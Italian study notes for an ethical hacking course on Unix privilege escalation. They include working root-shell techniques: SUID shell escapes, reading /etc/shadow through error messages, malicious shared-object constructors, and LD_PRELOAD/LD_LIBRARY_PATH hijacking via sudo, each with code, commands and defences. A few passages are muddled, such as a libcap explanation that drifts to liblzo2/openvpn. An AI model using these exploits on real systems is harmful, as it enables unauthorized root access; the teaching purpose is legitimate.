# ETHL 0x05 — Hacking Unix p1

> [!abstract] In una frase Sei già **dentro** un sistema con privilegi bassi (tipicamente `www-data` dopo una RCE web). Ora devi **salire** — Privilege Escalation (PE) — o **spostarti** verso altri utenti — Lateral Movement. Il filo conduttore è uno: **abusare di programmi che girano con privilegi maggiori dei tuoi** (`SetUID`/`SetGID`, `sudo`) costringendoli a fare cose non previste: leggere file, eseguire codice, caricare librerie che controlli tu.

> [!tip] Come usare questa nota Il prof chiede sempre il **perché** ("perché ha funzionato / perché no"). Per ogni tecnica trovi _cosa fa → perché funziona → come ci si difende_. I comandi delle slide sono **da saper leggere e commentare**, non da recitare. Le slide 19, 45 sono domande "spiega questo": le trovi in [[#Trappole d'esame]]. È il "dopo" di una RCE — le shell le hai già in [[ETHL 0x02 — Remote Access - Shells]].

---

## 1. Lateral Movement e Privilege Escalation

### 1.1 Il contesto: dopo il foothold

Dopo aver ottenuto un accesso iniziale (foothold), **spesso non hai abbastanza privilegi** per proseguire la kill chain. Servono per:

- **Stage 5 — Installation**: stabilire persistenza (potrebbe non essere possibile da utente non privilegiato)
- **Stage 7 — Actions on Objectives**: accedere a dati sensibili, installare ransomware, controllare il sistema **restando invisibili** (pulire le tracce, installare rootkit)

> [!info] Lo scenario tipico — Web App Dopo una RCE su una web app impersoni l'utente del web server:
> 
> ```
> www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
> ```
> 
> Nota `/usr/sbin/nologin` come shell e l'UID basso (33): sui sistemi moderni i servizi girano col **principio del minimo privilegio**, quindi `www-data` può fare poco. Da qui devi scalare.
> 
> ```
> irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
> redis:x:138:150::/var/lib/redis:/usr/sbin/nologin
> ```
notice: irc stands for Internet Relay chat which is a text based chat protocol from the 80s-90s, ircd is the irc deamon. if there is an irc account, then means that it is possible to abuse that service for privesc.
also redis is a in-RAM database service that could have access to ssh keys for example.

### 1.2 Definizioni

> [!note] PE vs Lateral Movement
> 
> - **Privilege Escalation** = ottenere accesso di livello **più alto** (tipicamente root), sfruttando: **bug**, **design flaw**, **errori di configurazione**, **errori degli utenti**.
> - **Lateral Movement** = spostarsi da un utente **allo stesso livello** verso un altro. Non è sempre una salita verticale: a volte un altro utente non privilegiato ti dà l'accesso che ti serve (a un servizio, un file, una chiave).

Entrambi sono possibili grazie a: (1) **informazioni raccolte** con l'accesso iniziale (es. password trovate sul sistema), e (2) il **cambio di scope** (servizi/applicazioni prima non raggiungibili).

### 1.3 Il Confused Deputy Problem

> [!info] Concetto trasversale — punto d'esame In cybersecurity, il **Confused Deputy** è un tipo specifico di PE: un programma con _più_ privilegi viene **ingannato** da un agente con _meno_ privilegi a **usare male la propria autorità**.
> 
> Esempi già visti nel corso:
> 
> - **XSS** → inganni il browser della vittima a eseguire JS arbitrario ([[ETHL 0x04 — Web Security p2]])
> - **FTP bounce scan** (nmap) → inganni un server FTP terzo a fare lo scan per te
> - **CSRF** → forzi un utente a compiere azioni su un'app dove è già autenticato
> - **Abuso di sudo/setuid** → costringi un programma privilegiato a fare cose non previste (il resto di questa nota)
> 
> È lo stesso schema dell'injection di [[ETHL 0x04 — Web Security p2]]: un componente fidato esegue qualcosa per conto di chi non dovrebbe.

---

## 2. Permessi UNIX — recap SetUID/SetGID

Tre **triadi** di permessi, leggibili in simbolico o ottale:

```
 U   G   O   (octal)
rwx r-x r-x  (0755)   ← file normale eseguibile
rws r-x ---  (4750)   ← SetUID attivo
rwx rws r-x  (2775)   ← SetGID attivo
```

| Triade | Chi riguarda                      |
| ------ | --------------------------------- |
| 1ª     | cosa può fare il **proprietario** |
| 2ª     | cosa può fare il **gruppo**       |
| 3ª     | cosa possono fare **gli altri**   |

Per ogni triade: `r` (read), `w` (write), `x` (execute). Il terzo carattere può diventare:

| Simbolo   | Significato                                                             |
| --------- | ----------------------------------------------------------------------- |
| `s` / `t` | setuid/setgid o sticky **+ eseguibile**                                 |
| `S` / `T` | setuid/setgid o sticky **non eseguibile** (la maiuscola = manca la `x`) |

> [!info] Cosa fa SetUID — il cuore di tutto Un binario con bit **SetUID** gira con l'**EUID del proprietario del file**, non dell'utente che lo lancia. Se il proprietario è `root` (UID 0), il programma gira con privilegi di root anche se lanciato da te. È esattamente ciò che si abusa: se riesci a far eseguire codice tuo a quel binario, il tuo codice eredita l'EUID di root.
> 
> ```
> -rwsr-xr-x 1 root _ssh ... ssh-agent   ← SetUID root
> -rwsr-xr-x 1 root root ... sudo        ← SetUID root
> ```

> [!note] Capabilities (solo accenno) Esistono anche le **capabilities** (es. `cap_net_raw=ep` su `ping`) — un modo più granulare di assegnare privilegi specifici senza SetUID root pieno. Il corso non le approfondisce ma vanno conosciute. Si leggono con `getcap`.

---

## 3. Note di sicurezza su SetUID — da ricordare

> [!warning] Punti tecnici che ricorrono all'esame
> 
> - **I symlink hanno sempre 0777** → i permessi effettivi sono quelli del **target** del link, non del link.
> - **Scrivere/cambiare ownership su un file setuid rimuove i bit setuid/setgid** (difesa automatica del kernel contro la sostituzione del binario).
> - **La maggior parte degli unix ignora il bit setuid sugli script `#!`** → vedi la spiegazione in [[#Trappole d'esame]] (secure scripting è difficile).
> - Un programma SetUID usa **EUID/EGID** (effective), diversi da **UID/GID** (real). Alcuni programmi fanno **drop dei privilegi** di default (per questo a volte serve `-p`).
> - **`LD_PRELOAD` e `LD_LIBRARY_PATH` sono ignorati per i binari SetUID** (il dynamic linker li scarta per sicurezza). Funzionano invece con `sudo`, a seconda della config → vedi [[#9. LD_PRELOAD e LD_LIBRARY_PATH]].

---

## 4. Abusare di programmi SetUID/SetGID

L'abuso porta a PE se il programma privilegiato:

### 4.1 Può leggere/scrivere file → leak di dati sensibili

Programmi come `less`, `more`, `vi`, `cat`, `strings` se SetUID root permettono di:

- leggere (o scrivere!) `/etc/shadow`, `/etc/sudoers`
- leakare password in database (combinato con riuso password → lateral movement)
- leakare chiavi private SSH di altri utenti
- leakare la command history altrui

### 4.2 Può stampare errori in modo insicuro → leak

Alcuni programmi rivelano parti di file arbitrari **nei messaggi d'errore**:

- `bridge --batch /etc/shadow` (se SetUID) → l'errore di parsing stampa righe dello shadow
- `date -f /etc/shadow` (se SetUID) → "invalid date 'root:$y$j9T...'" stampa l'hash mentre si lamenta del formato

> [!info] Perché funziona Il programma legge un file con privilegi root per processarlo, e quando il contenuto non rispetta il formato atteso lo **rigurgita nell'errore**. Tu non avresti potuto leggere `/etc/shadow`, ma il programma SetUID sì — ed è abbastanza "stupido" da mostrartelo. Confused Deputy puro. _Pensaci due volte prima di lasciare agli utenti il permesso di cambiare la data di sistema._

### 4.3 Può eseguire codice che controlli tu

Tre modi:

**(a) Eseguire altri programmi** — molti tool permettono di lanciare comandi esterni: `nmap`, `hping3`, `vim`, `gawk`, `less`, `more`, `find`, `docker`, `distcc`, `make`… → **[[GTFOBins]]** è il catalogo di riferimento.

> [!example] Abuso di SUID `hping3` e `vim`
> 
> ```
> ./hping3
> hping3> /bin/sh -p      ← hping3 ha una shell interattiva; -p mantiene i privilegi
> # id
> uid=1000(gt) ... euid=0(root) egid=0(root) ...
> ```
> 
> ```
> ./vim
> :!/bin/sh -p           ← vim esegue comandi esterni con :!
> ```
> 
> Il `-p` è cruciale: dice a `sh` di **non droppare** i privilegi (di default `bash`/`sh` riallineano UID a EUID per sicurezza).

> [!info] Quando si può "iniettare" il programma eseguito Si controlla cosa il SetUID esegue se:
> 
> 1. l'app eredita il **`PATH` che controlli tu** E usa **percorsi relativi** (es. chiama `ls` invece di `/bin/ls`), AND
> 2. l'app esegue un programma che **puoi sovrascrivere**
> 
> Non funzionano: **alias e funzioni** (vivono solo nella shell che li definisce, servono shell interattive) né i **built-in** (sono parte della shell stessa).

**(b) Caricare shared object (`.so`) che controlli** — se un eseguibile carica una libreria in modo insicuro, o puoi scrivere nella dir dove sta il `.so`.

> [!example] `.so` injection — demo calc/libcalc 
> Scenario: `suid-calc` carica `./libcalc.so` con `dlopen` usando un **path relativo** (insicuro).
> 
> **1. Scoprire il problema senza sorgente** — con `strace`:
> [[strace & ldd|Strace]] intercetta tute le chiamate a sistema e le stampa a schermo, [[strace & ldd|ldd]] invece è un disassembler che legge l'header binario (non vede l'allocazione dinamica)  
> ```bash
> strace ./suid-calc 2>&1 | grep -iE "open|access|no such file"
> # openat(AT_FDCWD, "./libcalc.so", ...) = -1 ENOENT (No such file or directory)
> ```
> 
> L'`ENOENT` su path relativo rivela che cerca la libreria nella **directory corrente** → la controlli tu. (`ldd` analizza staticamente le dipendenze.)
> 
> **2. Creare un `.so` malevolo** con un **constructor** che parte al caricamento:
> 
> ```c
> #include <stdlib.h>
> #include <unistd.h>
> static void inject() __attribute__((constructor));
> void inject() { setuid(0); system("/bin/sh"); }
> int function_awesome_sum(int, int) { return -1; }   // opzionale
> ```
> 
> ```bash
> gcc -shared -fPIC -o libcalc.so libcalc.c
> ```
> 
> **3. Eseguire** `./suid-calc` → carica il nostro `.so` → `inject()` parte → **shell root**.

> [!info] Perché `setuid(0)` e non `/bin/sh -p`? Il constructor gira con EUID=0 (perché suid-calc è SetUID root). `setuid(0)` imposta il **real UID** a 0 (possibile perché siamo privilegiati, vedi [[#7. Nota su setuid - privilegiato vs no]]), così la shell parte come root pieno senza bisogno di `-p`.

**(c) Vulnerabile ad altra code injection** (es. buffer overflow) → il codice iniettato gira con EUID/EGID privilegiati. Si vedrà nelle lezioni di binary exploitation (es. CVE-2019-10149, CVE-2019-14267).

---

## 5. Trovare i vettori SUID/SGID

```bash
find / -type f \( -perm -u+s -o -perm -g+s \) -ls 2>/dev/null
```

> [!info] Lettura del comando `-perm -u+s` = bit SetUID attivo; `-perm -g+s` = SetGID; `\( ... -o ... \)` = OR logico; `2>/dev/null` scarta gli errori di permesso sulle dir che non puoi leggere. È **il primo comando** da lanciare dopo un foothold per mappare i potenziali vettori di PE.

---

## 6. La challenge guess.sh (RCE su script)

> [!todo] Challenge (slide 19) — ~15 min Hackerare questo toy game per ottenere RCE:
> 
> ```bash
> #!/bin/bash
> random_number=$(( RANDOM % 100 ))
> while true; do
>   read -p "Enter your guess: " guess
>   if [[ "${guess}" -eq "${random_number}" ]]; then ...
> done
> # esposto in rete con:
> socat TCP-LISTEN:1234,fork EXEC:'./guess.sh',end-close
> ```
> 
> **Suggerimento concettuale** (mattone, non soluzione): in `[[ "${guess}" -eq "${random_number}" ]]` il confronto aritmetico di Bash **valuta** l'argomento come espressione. Se `guess` non è un numero ma un'espressione aritmetica, Bash la _valuta_ — e l'aritmetica Bash permette costrutti come `a[$(comando)]`. Pensa a cosa succede se inietti un'espressione invece di un numero. È injection nel contesto del confronto, lo stesso spirito di [[ETHL 0x04 — Web Security p2]].

---

## 7. Nota su setuid() — privilegiato vs no

> [!warning] Comportamento diverso a seconda dei privilegi (punto sottile) Su Linux `setuid(X)` si comporta diversamente:
> 
> - **processo privilegiato** (`euid=0` o `CAP_SETUID`): `setuid(X)` imposta il **real UID** a qualunque `X` → per questo nel `.so` malevolo `setuid(0)` funziona e dà root pieno.
> - **processo non privilegiato**: `setuid(X)` può solo impostare l'EUID al real UID corrente o al saved UID → non puoi diventare root da non-root chiamando `setuid(0)`.
> 
> Conseguenza: alcuni programmi SetUID **droppano i privilegi** appena partono (riallineano UID a EUID). Se trovi un SUID che "non funziona", controlla se fa drop early.
Questa si collega direttamente al punto delle tue note 0x07/0x08 ("`setuid(0)` prima di `execve`, altrimenti la shell droppa i privilegi"). Sciogliamola.

### Ogni processo ha TRE UID

- **real UID (ruid)**: chi sei _davvero_ — l'utente che ha lanciato il processo
- **effective UID (euid)**: chi il kernel usa per decidere "puoi fare questa azione?" → è **questo** che conta per i permessi
- **saved UID (suid)**: una copia di backup, serve a fare avanti-indietro tra privilegi

### Cosa ti dà un binario SetUID

Se un eseguibile ha il bit SetUID ed è di proprietà di root, quando tu (utente 1000) lo lanci:

```
ruid = 1000    ← sei sempre tu
euid = 0       ← root! per via del bit SetUID
suid = 0       ← copia salvata
```

`euid=0` → puoi fare cose da root. Ma il tuo `ruid` è ancora 1000. C'è un disallineamento.

### I due comportamenti di `setuid(X)`

Ecco il punto sottile: `setuid` fa cose diverse a seconda che il processo sia privilegiato o no.

|                             | processo **privilegiato** (euid=0)        | processo **non privilegiato** (euid≠0)                     |
| --------------------------- | ----------------------------------------- | ---------------------------------------------------------- |
| `setuid(X)` fa              | imposta **ruid, euid E suid** tutti a `X` | imposta **solo euid**, e solo a un valore tra {ruid, suid} |
| `setuid(0)` (tu, ruid=1000) | ✓ tutto a 0 → **root pieno**              | ✗ fallisce (EPERM): 0 non è né il tuo ruid né il tuo suid  |

Ecco perché nel `.so` malevolo `setuid(0)` funziona: il binario SetUID gira con `euid=0`, quindi il processo **è privilegiato** → `setuid(0)` mette tutti e tre gli UID a 0.

Da utente normale invece (euid=1000) non puoi: `setuid(0)` non ti fa diventare root perché 0 non è tra i tuoi UID consentiti. (È la protezione che impedisce a chiunque di auto-promuoversi root.)

### Perché serve `setuid(0)` PRIMA di lanciare la shell

Una shell (`sh`/`bash`), all'avvio, controlla: **euid == ruid?**

Se sono diversi (es. `euid=0`, `ruid=1000`), pensa: "sto girando in un contesto SetUID strano, potenzialmente pericoloso" e **riallinea euid a ruid (1000)** per sicurezza. Risultato:

```
execve("/bin/sh") con euid=0, ruid=1000  →  shell che NON è root
```

Se invece chiami `setuid(0)` _prima_ (mentre sei privilegiato), ottieni `ruid=euid=suid=0`. Ora la shell vede `euid==ruid==0`, nessun disallineamento, nessun drop:

```
setuid(0) → execve("/bin/sh")  →  shell ROOT ✓
```

Questo è esattamente il "`setuid(0)` prima di `execve`" delle tue note.

### La conseguenza: "drop early"

Un programma SetUID scritto bene può rinunciare ai privilegi appena parte:

```c
setuid(getuid());   // getuid() ritorna ruid = 1000
```

In quel momento il processo è ancora privilegiato (euid=0), quindi `setuid(1000)` mette **tutti e tre** gli UID a 1000 → **butta via root in modo permanente**. Da lì in poi sei non privilegiato, e nemmeno `setuid(0)` ti salva più.

Morale: se trovi un SUID che "non funziona" per la privilege escalation, controlla se fa questo drop all'inizio. Se ha già abbassato gli UID a 1000, la nave è salpata.

---

## 8. Exploiting sudo

### 8.1 Recap

[[Sudo]] (SuperUser-DO) esegue programmi come root. L'utente deve essere abilitato in `/etc/sudoers`; di norma serve la **sua** password (ma in security testing spesso impersoni utenti **senza** conoscerla). In breve: **`sudo` imposta UID e GID a quelli del superuser**.

```bash
sudo -l    # lista cosa l'utente corrente può fare con sudo
```

> [!info] Leggere l'output di sudo -l — è oro Mostra le voci tipo `(root) NOPASSWD: /usr/bin/systemctl start xkeysnail`. Ogni binario lì elencato è un **potenziale vettore**: se quel programma può eseguire comandi, leggere file, o caricare librerie, lo abusi (→ [[GTFOBins]] elenca esattamente come per ciascun binario). `NOPASSWD` = non serve nemmeno la password.

### 8.2 L'ambiente con sudo

L'environment **non è preservato** (si usa quello di root), a meno che: (1) sia specificato sulla command line, AND (2) sia consentito nei sudoers (`setenv`, assenza di `env_reset`/`env_delete`). Questo è la chiave per capire perché `LD_PRELOAD`/`LD_LIBRARY_PATH` a volte passano e a volte no.

> [!success] Stesse strategie del SUID/SGID Tutto ciò della sezione 4 vale anche per sudo (ricorda EUID/EGID): leggere/scrivere file, errori insicuri, eseguire codice (programmi, `.so`, code injection).

---

## 9. LD_PRELOAD e LD_LIBRARY_PATH

### 9.1 LD_PRELOAD

```c
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");   // evita loop infiniti sui sotto-processi
  system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o ./ldp.so ./ldp.c
sudo LD_PRELOAD=./ldp.so <qualsiasi binario eseguibile con sudo>
```

> [!info] Perché funziona (quando funziona) `LD_PRELOAD` forza il dynamic linker a **caricare la tua libreria prima** di tutte le altre. Il suo `_init()` parte subito e apre una shell con EUID=0 (perché lanciato via sudo). `unsetenv("LD_PRELOAD")` evita che la variabile si propaghi ai processi figli causando ricorsione. **Condizione**: i sudoers devono preservare `LD_PRELOAD` (no `env_reset`/`env_delete` per quella var).

---

**1. Cosa fa il dynamic linker normalmente**

Quando esegui un binario dinamico (es. `ls`), prima che parta `main()`, c'è un programma invisibile — il **dynamic linker** (`ld.so`) — che:

1. legge la lista delle librerie richieste dal binario (es. `libc.so.6`)
2. le carica in memoria
3. esegue eventuali funzioni "constructor"/`_init()` di quelle librerie
4. solo a questo punto fa partire `main()`

Tutto questo è trasparente — il programma non sa nemmeno che è successo.

---

**2. Cos'è `LD_PRELOAD`**

È una variabile d'ambiente che dici al dynamic linker: _"prima di caricare qualsiasi altra libreria, carica anche questa che ti indico io"_.

```bash
LD_PRELOAD=./mialib.so ls
```

`ld.so` carica `mialib.so` **per prima**, esegue il suo `_init()`, e **poi** procede normalmente con `libc` e il resto. Non sostituisce niente — aggiunge.

---

**3. Perché questo ti dà una shell**

Se la tua libreria ha:

```c
void _init() {
  unsetenv("LD_PRELOAD");
  system("/bin/sh");
}
```

`_init()` viene eseguito automaticamente **durante la fase di caricamento**, ancora prima che il programma target faccia qualsiasi cosa. `system("/bin/sh")` apre una shell.

---

**4. Dove entra `sudo`**

Da solo, `LD_PRELOAD=./mialib.so ls` ti darebbe una shell con i tuoi privilegi normali (1000) — non interessante.

Il trucco è farlo **dentro un comando lanciato con `sudo`**:

```bash
sudo LD_PRELOAD=./ldp.so qualche_comando
```

`sudo` esegue `qualche_comando` con `euid=0`. Se `sudo` **non cancella** la variabile `LD_PRELOAD` dal suo ambiente (dipende dalla configurazione `/etc/sudoers`), il dynamic linker la vede e carica la tua libreria — ma ora il processo che la sta caricando è già root. Quindi `_init()` gira con `euid=0`, e `system("/bin/sh")` apre una shell root.

---

**5. Perché `unsetenv("LD_PRELOAD")`**

`system("/bin/sh")` lancia un processo figlio (`/bin/sh`). Se `LD_PRELOAD` è ancora nell'ambiente, anche `/bin/sh` (e ogni comando che lanci da quella shell) ricaricherebbe `ldp.so`, rieseguendo `_init()` — un loop. `unsetenv` lo evita: rimuove la variabile prima che venga ereditata dal figlio.

**6. condizioni per far sopravvivere ld_preload**

`env_reset` ed `env_delete` sono direttive di `/etc/sudoers` che controllano quali variabili d'ambiente `sudo` lascia passare al comando che esegue.

`env_reset` (default su quasi tutti i sistemi) fa ripartire `sudo` con un ambiente "pulito" — non eredita le tue variabili, ne costruisce uno nuovo minimale. `LD_PRELOAD` non sopravvive.

`env_delete` è una blacklist esplicita di variabili da rimuovere comunque, anche se per qualche motivo `env_reset` non fosse attivo — e `LD_PRELOAD`/`LD_LIBRARY_PATH` ci sono quasi sempre per default proprio perché sono i vettori di attacco classici.

**Perché sono la condizione per LD_PRELOAD**: se una di queste due elimina `LD_PRELOAD`, il dynamic linker del processo lanciato da `sudo` non la vede mai — non carica la tua libreria, niente `_init()`, niente shell.

L'attacco funziona solo se i sudoers sono configurati per **preservarla** esplicitamente, ad esempio con:

```
Defaults env_keep += "LD_PRELOAD"
```

In pratica: cerchi questa riga (o l'assenza di `env_reset`) in `sudo -l` o in `/etc/sudoers` — se c'è, `LD_PRELOAD` passa indenne e l'attacco funziona.

---

### 9.2 LD_LIBRARY_PATH

```c
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { system("/bin/sh"); }
```

```bash
# 1. trova una libreria usata dal target
ldd /usr/sbin/bridge        # → libcap.so.2 => /lib/.../libcap.so.2
# 2. compila un fake con lo stesso nome
gcc -o /tmp/libcap.so.2 -shared -fPIC ldlp.c
# 3. lancia il target con LD_LIBRARY_PATH che punta alla tua dir
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/bridge
```

> [!danger] "It didn't work, did it? Why? How to fix it?" (slide 45) — Trappola d'esame La slide lascia la risposta come challenge. Il ragionamento atteso:
> 
> **Perché può fallire:**
> 
> 1. **`env_reset` / `env_delete` nei sudoers** — sudo elimina `LD_LIBRARY_PATH` (e `LD_PRELOAD`) dall'ambiente per sicurezza prima di eseguire. Se la config li scarta, la variabile non arriva mai al linker. (Nota: per i binari **SetUID** queste var sono _sempre_ ignorate dal linker; con sudo dipende dalla config — vedi sezione 3.)
> 2. **Symbol resolution** — il tuo fake `libcap.so.2` esporta solo `inject()`, ma `bridge` si aspetta i simboli reali (`cap_*`). Se il binario è linkato in binding immediato (`-z now`), il linker **risolve tutti i simboli al caricamento**, fallisce sui simboli mancanti e **aborta prima** di eseguire il tuo constructor → niente shell.
> 
> **Come si aggiusta:**
> 
> - far sì che la tua libreria **esporti anche i simboli** che il target richiede (stub), così il linker non aborta e il constructor parte; oppure
> - usare `LD_PRELOAD` invece (aggiunge la lib **in più** invece di sostituirla, quindi non rompe i simboli); oppure
> - assicurarsi che i sudoers consentano la variabile (`setenv`).
> 
> Il punto didattico: `LD_PRELOAD` _aggiunge_, `LD_LIBRARY_PATH` _sostituisce_ — e sostituire una libreria richiede di non rompere ciò che il binario si aspetta da quella libreria.

`LD_LIBRARY_PATH` è una variabile d'ambiente che dice al dynamic linker: _"quando cerchi le librerie, guarda anche (o prima) in queste directory"_.

```bash
LD_LIBRARY_PATH=/tmp ./programma
```

Normalmente `ld.so` cerca `libcap.so.2` nei path standard (`/lib`, `/usr/lib`, ecc.). Con questa variabile, gli dici di cercare prima in `/tmp`. Se in `/tmp` c'è un file chiamato `libcap.so.2`, **quello** viene caricato — al posto dell'originale. 

ma che cos'è libcap.so? `liblzo2` è una libreria di compressione (LZO — Lempel-Ziv-Oberhumer, un algoritmo veloce). `openvpn` la usa per comprimere il traffico prima di cifrarlo/inviarlo — chiama funzioni come `lzo1x_compress()`, `lzo1x_decompress()`, ecc. Il punto è solo: è una libreria che il binario (`openvpn`) usa attivamente per fare un lavoro reale, esportando funzioni con nomi specifici (`lzo1x_compress`, ecc.), esattamente come `libcap.so.2` esportava `cap_get_proc` nell'esempio precedente.

A differenza di `LD_PRELOAD` (che _aggiunge_ una libreria extra senza toccare le altre), `LD_LIBRARY_PATH` _sostituisce_ — il programma carica il tuo file invece di quello vero, pensando che sia la stessa cosa.

**Il problema**: il programma si aspetta che `libcap.so.2` contenga certe funzioni (`cap_get_proc`, `cap_free`, ecc.). Se il tuo file fake contiene solo il tuo codice malevolo e non quelle funzioni, il linker non trova quello che cerca → errore "simbolo non trovato" → il programma si blocca prima ancora di partire.

**Per attaccare**: trovi una libreria che il binario SUID/sudo carica con path relativo o tramite `LD_LIBRARY_PATH` configurabile, crei un file con lo stesso nome contenente un constructor malevolo, e lo metti in una directory che controlli — sperando che `sudo`/il sistema rispettino la variabile.

---

## 10. Trappole d'esame

> [!danger] Le domande "spiega questo / perché" tipiche del lab
> 
> 1. **PE vs Lateral Movement** → salire di privilegio vs spostarsi tra utenti allo stesso livello.
> 2. **Confused Deputy** → componente privilegiato ingannato da uno meno privilegiato (XSS, CSRF, FTP bounce, abuso sudo/setuid).
> 3. **Cosa fa SetUID** → il binario gira con l'EUID del **proprietario**, non di chi lo lancia. Se owner=root → privilegi root.
> 4. **Perché gli unix ignorano setuid sugli script `#!`** → secure scripting è difficile: tra l'apertura dello script e l'esecuzione dell'interprete c'è una **race condition** (TOCTOU) sfruttabile via symlink, e l'interprete eredita variabili/comportamenti manipolabili. Più sicuro disattivarlo del tutto.
> 5. **`-p` su `/bin/sh`** → impedisce alla shell di droppare i privilegi (riallineare UID a EUID).
> 6. **`setuid(0)` vs `/bin/sh -p`** → con EUID=0 puoi settare il real UID a 0; ottieni root pieno senza `-p`.
> 7. **Programma stampa errori insicuri** → legge file privilegiati e ne rigurgita parti nei messaggi d'errore (es. `date -f /etc/shadow`).
> 8. **`.so` injection: come si scopre** → `strace ... | grep open/access` mostra l'`ENOENT` su path relativo; `ldd` analizza staticamente.
> 9. **constructor `__attribute__((constructor))`** → codice che parte al **caricamento** della libreria, prima ancora che venga chiamata la funzione "vera".
> 10. **setuid() privilegiato vs no** → privilegiato setta il real UID a qualunque X; non privilegiato solo a real/saved UID.
> 11. **`sudo -l`** → enumera i binari eseguibili come root; ogni voce è un potenziale vettore (cross-ref GTFOBins).
> 12. **LD_PRELOAD vs LD_LIBRARY_PATH** → preload _aggiunge_ una lib, library_path _sostituisce_; e perché LD_LIBRARY_PATH spesso fallisce (env_reset / simboli mancanti / `-z now`).
> 13. **`LD_*` ignorati per SetUID** → il dynamic linker li scarta sui binari SetUID; con sudo dipende dalla config sudoers.
> 14. **Il find dei SUID** → `find / -type f \( -perm -u+s -o -perm -g+s \) -ls 2>/dev/null`, primo comando di recon post-foothold.

---

## 11. Tabella riassuntiva: vettore → come si abusa → difesa

|Vettore|Come si abusa|Difesa chiave|
|---|---|---|
|SUID che legge file|`cat`/`less`/`vi` su `/etc/shadow`|non dare SUID a tool di lettura generici|
|SUID che stampa errori|`date -f /etc/shadow` leaka l'hash|non leakare contenuti negli errori, minimo privilegio|
|SUID esegue programmi|`vim :!/bin/sh -p`, GTFOBins|percorsi assoluti, no shell-escape, drop privilegi|
|SUID con PATH relativo|sovrascrivi il binario chiamato|percorsi assoluti, sanitizzare PATH|
|`.so` injection|fake `libcalc.so` con constructor|path assoluti per `dlopen`, RPATH sicuro|
|sudo binario abusabile|`sudo -l` → GTFOBins|sudoers restrittivo, niente NOPASSWD su tool potenti|
|LD_PRELOAD via sudo|preload `.so` con `_init()`|`env_reset` nei sudoers (default moderno)|
|LD_LIBRARY_PATH via sudo|fake lib con symlink/stub|`env_delete+=LD_*`, binding immediato|
|code injection (BOF)|shellcode con EUID privilegiato|hardening binario (ASLR, RELRO, stack canary)|

---

## 12. Attività consigliate (dalle slide)

- **TryHackMe — Linux PrivEsc** (free room)
- **Linux Privilege Escalation challenges** — `linux-privesc` (ambiente Docker)
- Riferimenti: **[[GTFOBins]]**, HackTricks (privilege-escalation, checklist, tunneling), **John the Ripper**, **Hashcat** (per crackare gli hash leakati da `/etc/shadow`).

---

## 13. Richiamo attivo (a libro chiuso)

> [!question] Verifica
> 
> 1. Distingui PE da Lateral Movement con un esempio per ciascuno.
> 2. Cos'è il Confused Deputy Problem? Dai tre esempi visti nel corso.
> 3. Un binario è `-rwsr-xr-x root root`. Cosa significa la `s`? Con quale EUID gira se lo lancio io (UID 1000)?
> 4. Perché gli unix ignorano il bit SetUID sugli script `#!`?
> 5. Spiega la catena completa di una `.so` injection su un SUID con path relativo (scoperta → exploit → shell).
> 6. Perché nel constructor uso `setuid(0)` e non lancio direttamente `/bin/sh -p`?
> 7. Differenza di comportamento di `setuid()` tra processo privilegiato e non.
> 8. Dato `sudo -l`, cosa cerchi e come lo trasformi in PE?
> 9. Perché `LD_PRELOAD` funziona ma `LD_LIBRARY_PATH` può fallire? Come lo aggiusti?
> 10. Qual è il primo comando che lanci dopo un foothold per cercare vettori SUID/SGID?

---

> [!quote] Filo conduttore Privilege escalation su Unix = **trovare un programma che gira con più privilegi di te e convincerlo a lavorare per te**. Cambia il meccanismo (SetUID, sudo, LD_PRELOAD, `.so`, errori verbosi), non il principio. È il Confused Deputy applicato al sistema operativo — lo stesso "fidarsi di un input controllato dall'attaccante" che hai visto nel web in [[ETHL 0x04 — Web Security p2]], qui spostato sul filesystem e sul dynamic linker. La difesa è sempre **minimo privilegio + niente input/percorsi controllabili nei processi privilegiati**.
